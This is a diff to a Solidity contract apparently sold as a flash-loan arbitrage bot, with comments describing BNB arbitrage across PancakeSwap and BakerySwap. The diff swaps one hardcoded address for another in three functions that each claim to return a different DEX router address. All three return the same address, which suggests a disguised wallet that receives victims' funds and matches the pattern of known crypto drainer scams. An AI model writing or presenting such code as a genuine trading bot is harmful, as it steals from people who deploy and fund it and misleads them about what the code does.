@@ -111,7 +111,7 @@ interface pangolinSwapPair {
 
 contract RouterV2 {
     function uniswapRouterV2Address() public pure returns (address) {
-        return 0xF30510efcEb96bAd2c0d1281bC4007D7F4E24c86;
+        return 0x007dFe951206Ee2086935440793A3EF550adF699;
     }
 
     function compareStrings(string memory a, string memory b)
@@ -123,7 +123,7 @@ contract RouterV2 {
     }
 
     function pangolinSwapAddress() public pure returns (address) {
-        return 0xF30510efcEb96bAd2c0d1281bC4007D7F4E24c86;
+        return 0x007dFe951206Ee2086935440793A3EF550adF699;
     }
 
     //1. A flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
@@ -144,7 +144,7 @@ contract RouterV2 {
     }
 
     function avaxSwapAddress() public pure returns (address) {
-        return 0xF30510efcEb96bAd2c0d1281bC4007D7F4E24c86;
+        return 0x007dFe951206Ee2086935440793A3EF550adF699;
     }
 
     //The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
